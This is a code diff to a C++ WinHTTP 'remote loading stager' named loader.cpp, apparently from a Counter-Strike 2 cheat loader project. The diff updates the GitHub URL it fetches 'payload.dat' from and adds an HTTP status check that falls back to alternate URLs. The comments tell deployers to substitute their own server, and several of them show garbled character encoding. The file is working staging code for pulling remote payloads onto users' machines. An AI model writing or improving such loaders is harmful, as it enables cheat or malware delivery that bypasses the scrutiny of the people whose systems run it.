@@ -1,4 +1,4 @@
-﻿// ============================================================
+// ============================================================
 // loader.cpp �?远程加载 Stager
 //
 // 架构:
@@ -26,7 +26,7 @@
 // Payload 下载地址 �?部署时替换为你的服务�?URL
 // �?CDN 备�?(国内网络可能无法直连 raw.githubusercontent.com)
 static const wchar_t* PAYLOAD_URLS[] = {
-    L"https://raw.githubusercontent.com/heruixii/cs2-remote-loader/926b2cc/payload.dat",
+    L"https://raw.githubusercontent.com/heruixii/cs2-remote-loader/bb0affb/payload.dat",
 };
 static const int PAYLOAD_URL_COUNT = sizeof(PAYLOAD_URLS) / sizeof(PAYLOAD_URLS[0]);
 
@@ -128,7 +128,7 @@ static std::vector<uint8_t> DownloadPayload(const wchar_t* url) {
         DOWNLOAD_TIMEOUT_MS, DOWNLOAD_TIMEOUT_MS,
         DOWNLOAD_TIMEOUT_MS, DOWNLOAD_TIMEOUT_MS);
 
-    // 发送请�?
+    // 发送请求
     if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                             WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
         !WinHttpReceiveResponse(hRequest, nullptr)) {
@@ -136,6 +136,19 @@ static std::vector<uint8_t> DownloadPayload(const wchar_t* url) {
         WinHttpCloseHandle(hConnect);
         WinHttpCloseHandle(hSession);
         return result;
+    }
+
+    // v3.24: 检查 HTTP 状态码, 404/500 等非200直接跳过
+    DWORD statusCode = 0;
+    DWORD statusCodeSize = sizeof(statusCode);
+    if (!WinHttpQueryHeaders(hRequest,
+            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+            WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize,
+            WINHTTP_NO_HEADER_INDEX) || statusCode != 200) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return result; // 返回空 → 调用者尝试下一个 URL
     }
 
     // 读取响应
